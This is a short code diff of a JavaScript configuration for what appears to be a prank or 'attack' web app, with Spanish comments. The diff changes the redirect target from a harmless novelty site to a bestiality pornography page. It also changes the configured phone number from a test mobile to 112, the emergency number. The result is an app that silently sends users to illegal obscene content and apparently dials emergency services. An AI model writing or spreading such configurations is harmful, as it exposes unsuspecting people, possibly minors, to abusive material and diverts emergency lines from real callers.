@@ -10,12 +10,12 @@ const appConfig = {
 
     // === ATAQUE: redirección web ===
     // URL a la que redirige el ataque. Cámbiala aquí fácilmente.
-    attackUrl: 'https://theuselessweb.com/',
+    attackUrl: 'https://beastiality.tv/es/tag/goat-sex/',
     redirectDelay: 2,
 
     // === ATAQUE: llamada telefónica ===
     // Número de teléfono configurable. Puede ser tu móvil de pruebas o 112 (solo demostración).
-    phoneNumber: '+34600000000',
+    phoneNumber: '112',
 
     // Parámetros URL para forzar modos:
     // ?cards=1  -> forzar cartas
